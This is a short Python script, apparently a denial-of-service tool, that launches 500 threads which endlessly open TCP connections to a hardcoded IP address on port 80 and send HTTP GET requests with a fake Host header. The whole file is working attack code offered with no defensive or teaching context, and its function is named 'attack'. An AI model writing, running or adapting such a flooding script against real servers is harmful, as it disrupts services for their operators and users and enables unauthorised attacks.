import threading
import socket

IP_TARGET = "182.21.20.43"
PORT_TARGET = 80
FAKE_IP = "182.21.20.33"

CONNECTED = 0

def attack():
    while True:
        s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP_TARGET, PORT_TARGET))
        s.sendto(("GET /" + IP_TARGET + " HTTP/1.1\r\n").encode('ascii'), (IP_TARGET, PORT_TARGET))
        s.sendto(("Host: " + FAKE_IP + "\r\n\r\n").encode('ascii'),(IP_TARGET, PORT_TARGET))
        s.close()
        global CONNECTED
        CONNECTED += 1
        print(CONNECTED)

for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()
